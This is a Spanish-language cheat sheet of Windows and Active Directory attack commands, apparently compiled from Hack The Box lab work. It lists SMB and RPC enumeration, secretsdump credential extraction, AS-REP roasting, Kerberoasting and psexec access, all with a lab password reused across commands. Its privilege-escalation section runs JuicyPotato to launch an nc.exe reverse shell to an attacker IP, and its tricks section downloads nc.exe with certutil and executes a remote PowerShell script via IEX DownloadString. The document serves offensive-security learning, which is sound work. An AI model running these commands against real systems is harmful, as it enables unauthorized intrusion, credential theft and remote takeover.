## Windows

El objetivo de esta página es documentar los comandos mas utilizados en enumeración y explotaciónde máquinas Windows.

### crackmapexek

Para ver info de un equipo sin credenciales:

<pre>
crackmapexec smb 10.10.10.100 
</pre>

Para ver recursos compartidos sin credenciales:

<pre>
  crackmapexec smb 10.10.10.100  --shares
</pre>

Para conectar con credenciales:

<pre>
  crackmapexec smb 10.10.10.100  -u 'usuario' -p 'password' --shares
</pre>

### smbmap

Para conectar a un host sin credenciales, nos lista unidades sin credenciales:

<pre>
smbmap -H 10.10.10.1000
smbmap -H 10.10.10.237 -u 'null'
</pre>

Para conectar ver lo que tiene un recurso, paramero -r:

<pre>
smbmap -H 10.10.10.1000 -r Replication
</pre>

Para descargarnos algo, parámetro --download

<pre>
smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
</pre>

Con credenciales:

<pre>
smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Groups
</pre>

### SMBGET 

Para descargar un directorio entero:

<pre>
smbget -R smb://active.htb/Replication -U ""
</pre>

### smbclient

Visualizar sin credenciales:

<pre>
smbclient -L //10.10.10.100/Replication -N

</pre>

Tambien se puede montar unidad con **mount**

<pre>
sudo mount -t cifs //active.htb/Replication /mnt/HTB/Active -o username="{user}",password="{pass}",domain=active.htb,rw
</pre>
### rpcclient

Una vez que tenemos credencales nos podemos conectar co  **rpcclient**:

<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100
</pre>

Tambien es posible a veces conectarse con sesion null:
<pre>
rpcclient -U "" 10.10.10.100 -N
</pre>

Con credenciales, listamos usuarios del dominio:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'enumdomusers'
</pre>


Con credenciales, listamos grupos del dominio:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'enumdomgroups'
</pre>


Con credenciales, usuarios de un grupo. Pasamos el id de grupo:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'querygroupmem 0x200'
</pre>



Con credenciales, Info de un  usuario por su id:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'queryguser 0x1f4'
</pre>

Con credenciales, ver las desripciones de todos los usuarios:
<pre>
rpcclient -U "USUARIO%CONTRASEÑA" 10.10.10.100 -c 'querygdispinfo'
</pre>

### rpcenum

Herramienta de s4vitar para enumerar usuarios y grupos de un dominio. Revisar m´áquina Active de HTB para ver como configurarla.
### SecretDump

Si nos hacemos con copia de la SAM y el SYSTEM de c:\windows\System32\config:

<pre>
impacket-secretsdump -sam SAM.back -system SYSTEM.back LOCAL
</pre>
### ASREPRoast Attack

Cuando solo se dispone de usuarios, sin credenciales, **y estando en un entorno de active directory** se puede intentar un ASREPRoast Attack con GetNPUsers:
<pre>
GetNPUsers.py active.htb/ -no-pass -usersfile users.txt 
</pre>

Tambien puede hacerse un ataque 
### Kerbrute

Si está el puerto de kerberos aberto, el 88, se puede usar kerbrute para enumerar teniendo un diccionario.
<pre>
kerbrute userenum -dc 10.10.10.100 -d active.htb /usr/share/wordlists/SecList/Usernames/Names/names.txt
</pre>

### GetUsersSPNs, Kerberoasting ATTACK

Si no es Kerberoasteable podemos usar esta opción para enumerar.

<pre>
GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA
</pre>

Si hay resultado se puede obtener un TGS, (Ticket Garanting Service). El hash se puede intentar romper con john


<pre>
GetUsersSPNs.py active.htb/USUARIO:CONTRASEÑA -request
</pre>

Tambien puede hacerse kerberos con credenciales con *+crackmapexec**:

<pre>
crackmapexec ldap active.htb -u SVC_TGS -p GPPstillStandingStrong2k18 --kerberoasting TGS-REP
</pre>
### PSEXEC

Si con **crackmapexec smb** nos aparece **Pwned** podemos obtener acceso con psexec:

<pre>
psexec.py active.htb/Administrator:CONTRASEÑA@10.10.10.100 cmd.exe
</pre>

## ESCALADA DE PRIVILEGIOS

### SeImpersonatePrivilege

si el usuario pertenece a este grupo hay varias vias de convertirse en **NT Authority System**.

#### Juicy Potato

Se puede escalar privilegios, previa subida de JuicyPotato.exe y nc.exe:

<pre>
JP.exe -t * -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\\windows\temp\privescnc.exe -e cmd 10.10.14.51 4446"
</pre>

Cambiando el CLSI en base al operativo:

<pre>
.\JP.exe -t * -p c:\windows\system32\cmd.exe -l 1337 -a "/c c:\\windows\temp\privesc\nc.exe -e cmd 10.10.14.51 443" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
</pre>
#### Chimichurry
Otra vía es **Chimichurri**, aunque a veces no va.

<pre>
Chimichurri.exe 10.10.14.51 4446
</pre>

## TRUCOS

### subir archivos desde CMD:
<pre>
certutil.exe -f -urlcache -split http://10.10.14.51/nc.exe nc.exe
</pre>

### Subir y ejecutar con POWERSHWLL

<pre>
powershell IEX (New-Object Net.WebClient).DownloadString('"'http://10.10.14.51:8000/PS.ps1')
</pre>
### Enumerar SYSVOL

Si se puede enumerar SYSVOL hay que buscar el ficehro Groups.txt, (Policies/xxxx/MACHINE/Preferences/Group).
Como microsoft publicó la clave de desencriptación se puede utilizar **gpp-decript**.

<pre>
gpp-decrypt 'CONTRASEÑAENCRIPTADA'
</pre>

### Sincronizar reloj

Para ataques ASREPRoast o kerbrute hay que sincronizar el reloj con el de la maquina active directory:

<pre>
ntpdate 10.10.10.100
</pre>

Con **date -s** podemos volver a dejar la fecha igual. Investigar como.

### ver certificado SSL

<pre>
echo | openssl s_client -connect 10.129.173.50:443  
</pre>

## Enlaces de interes

[Windows Cheet-Sheet by Intrusionz3r0](https://intrusionz3r0.github.io/posts/Windows/)
